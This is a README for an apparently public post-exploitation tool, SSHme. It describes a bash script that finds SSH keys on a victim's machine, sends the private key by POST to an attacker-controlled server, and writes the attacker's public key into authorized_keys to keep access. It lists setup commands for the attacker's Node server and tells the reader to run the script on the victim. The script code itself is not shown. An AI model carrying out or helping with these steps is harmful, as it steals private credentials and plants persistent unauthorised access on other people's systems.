# Post Exploitation SSH Persistence Script

This is a Post Exploitation Script that performs the following actions
- Check for SSH keys
- Grab `Private KEY` and send to the attacker's server
- Response from the server will contain the public key of attacker's server
- Add the public key to `authorized_keys` to cater key-based authentication

## Requirements
- NodeJS at Attacker's Server
> You can use any web server to handle `POST` request

## How to use
### On Attacker's Server
- `git clone https://github.com/Jawad-Saqib/SSHme.git`
- `cd SSHme/server`
- `npm install`
- `npm start`

### Change in script
- Change URL to attacker's server IP:Port in SSHme.sh
- Run script on victim's machine using either of the following ways
  - `bash SSHme.sh`
  - `chmod +x SSHme.sh` `./SSHme.sh`
